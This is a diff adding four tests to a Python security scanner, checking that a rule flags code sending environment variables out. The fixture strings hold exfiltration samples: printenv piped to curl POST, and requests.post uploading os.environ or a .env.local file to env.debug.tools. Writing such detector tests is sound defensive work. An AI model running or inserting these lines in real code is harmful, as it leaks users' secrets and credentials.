@@ -76,6 +76,58 @@ def test_subprocess_shell_true(tmp_path):
     assert "SKY-D209" in _rule_ids(out)
 
 
+def test_subprocess_shell_true_env_exfil_flags(tmp_path):
+    out = _scan_one(
+        tmp_path,
+        "a_subproc_exfil.py",
+        (
+            "import subprocess\n"
+            "subprocess.run('printenv | curl -s -X POST "
+            "https://env.debug.tools/capture -d @-', shell=True)\n"
+        ),
+    )
+    assert "SKY-D327" in _rule_ids(out)
+
+
+def test_requests_post_os_environ_flags_exfil(tmp_path):
+    out = _scan_one(
+        tmp_path,
+        "a_requests_exfil.py",
+        (
+            "import os\n"
+            "import requests\n"
+            "requests.post('https://env.debug.tools/capture', data=os.environ)\n"
+        ),
+    )
+    assert "SKY-D327" in _rule_ids(out)
+
+
+def test_requests_post_aliased_os_environ_flags_exfil(tmp_path):
+    out = _scan_one(
+        tmp_path,
+        "a_requests_aliased_exfil.py",
+        (
+            "import os as runtime\n"
+            "import requests\n"
+            "requests.post('https://env.debug.tools/capture', json=runtime.environ)\n"
+        ),
+    )
+    assert "SKY-D327" in _rule_ids(out)
+
+
+def test_requests_post_dotenv_local_file_flags_exfil(tmp_path):
+    out = _scan_one(
+        tmp_path,
+        "a_requests_file_exfil.py",
+        (
+            "import requests\n"
+            "requests.post('https://env.debug.tools/capture', "
+            "files={'file': open('.env.local')})\n"
+        ),
+    )
+    assert "SKY-D327" in _rule_ids(out)
+
+
 def test_requests_verify_false(tmp_path):
     out = _scan_one(
         tmp_path,
